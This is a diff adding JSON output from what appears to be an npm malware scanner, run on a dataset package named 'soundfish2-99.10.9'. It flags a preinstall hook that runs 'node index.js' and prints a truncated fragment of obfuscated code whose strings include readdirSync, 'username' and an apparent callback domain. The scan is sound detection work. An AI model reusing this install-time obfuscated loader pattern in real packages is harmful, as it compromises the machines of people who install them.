@@ -1,0 +1,28 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "npm-steganography": {},
+        "npm-exec-base64": {},
+        "npm-silent-process-execution": {},
+        "npm-exfiltrate-sensitive-data": {},
+        "npm-serialize-environment": {},
+        "npm-install-script": [
+            {
+                "location": "package/package.json:8",
+                "code": "  \"preinstall\":\"node index.js\"\n",
+                "message": "The package.json has a script automatically running when the package is installed"
+            }
+        ],
+        "npm-obfuscation": [
+            {
+                "location": "package/index.js:1",
+                "code": "var _0x27b98b=_0x2081;function _0x34b7(){var _0x222369=['from','readdirSync','425a2.33mail.ga','7316440QIupwm','::1','aws-7grara913oid5jsexgkq','3PSzYjc','2958208GevtqU','length','instance','fe80::','username','2220399PPmXsc','end','error',...1df)]();}\n",
+                "message": "This package is using a common obfuscation method often used by malware"
+            }
+        ],
+        "shady-links": {},
+        "npm-dll-hijacking": {}
+    },
+    "path": "./dataset/npm/soundfish2-99.10.9"
+}
